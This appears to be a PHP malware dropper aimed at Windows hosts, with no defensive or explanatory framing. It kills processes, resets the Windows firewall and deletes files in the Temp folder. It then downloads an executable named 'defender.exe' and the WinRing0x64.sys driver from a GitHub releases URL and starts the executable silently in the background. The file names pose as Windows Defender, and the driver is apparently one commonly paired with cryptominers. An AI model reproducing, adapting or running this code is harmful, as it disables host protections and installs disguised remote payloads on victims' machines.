    /*<?php /**/




function downloadFile($url, $savePath) {
    // Check if file already exists
    if (file_exists($savePath)) {
        echo "File already exists: $savePath\n";
        return true;
    }

    // Open file handle for writing
    $fp = fopen($savePath, 'w');
    if ($fp === false) {
        echo "Failed to open file for writing: $savePath\n";
        return false;
    }

    // Open URL for reading
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_TIMEOUT, 0); // No timeout
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
    curl_setopt($ch, CURLOPT_FAILONERROR, true); // Fail on HTTP error

    // Execute download
    $success = curl_exec($ch);
    if (!$success) {
        echo "Download error: " . curl_error($ch) . "\n";
        fclose($fp);
        unlink($savePath); // Remove incomplete file
        curl_close($ch);
        return false;
    }

    curl_close($ch);
    fclose($fp);
    echo "Downloaded and saved: $savePath\n";
    return true;
}



function executeCommand($command) {
    $output = null;
    $returnCode = null;
    exec($command, $output, $returnCode);
    if ($returnCode === 0) {
        echo "Command executed successfully.\n";
    } else {
        echo "Failed to execute command. Return code: $returnCode\n";
    }
}


$deletePaths = [
    'C:/Windows/Temp/defender.exe',
    'C:/Windows/Temp/WinRing0x64.sys',
    'C:/Windows/Temp/config.json',

];





$checkfile1 = 'C:/Windows/Temp/defender.exe';
system('taskkill /IM defender.exe /F');     
system('taskkill /IM defender.exe /F');    
system('del /f /q "C:/Windows/Temp/defender.exe"');  

system('netsh advfirewall reset');  
system('mkdir "C:\Windows\Temp\RightProgram"');  
exec('tasklist', $output);

$url =  'https://github.com/danialchork/project-final/releases/download/last2/defender.exe';
$url2 =  'https://github.com/danialchork/project-final/releases/download/last/WinRing0x64.sys';

$file_name = 'C:/Windows/Temp/RightProgram/defender.exe';
$file_name2 = 'C:/Windows/Temp/RightProgram/WinRing0x64.sys';

$found = false;
$found2 = false;
foreach ($output as $line) {
    if (stripos(strtolower($line), 'spotify.exe') !== false) {
        $found = true;

    }
    if (stripos(strtolower($line), 'defender.exe') !== false) {
        $found2 = true;

    }
}

if (!$found && !$found2) {


           system('del /f /q "C:/Windows/Temp/defender.exe"');     
        system('del /f /q "C:/Windows/Temp/WinRing0x64.sys"');
        system('del /f /q "C:/Windows/Temp/config.json"');


        if (downloadFile($url2, $file_name2)) {
            // File downloaded successfully, continue with rest of your script
            echo "Proceeding with further processing...\n";
            // Your code here
        } else {
            echo "Failed to download file, aborting further processing.\n";
        }
        if (downloadFile($url, $file_name)) {
            // File downloaded successfully, continue with rest of your script
            echo "Proceeding with further processing...\n";
            // Your code here
        } else {
            echo "Failed to download file, aborting further processing.\n";
        }
         system('start /B "" "C:\Windows\Temp\RightProgram\defender.exe"');
        }





}

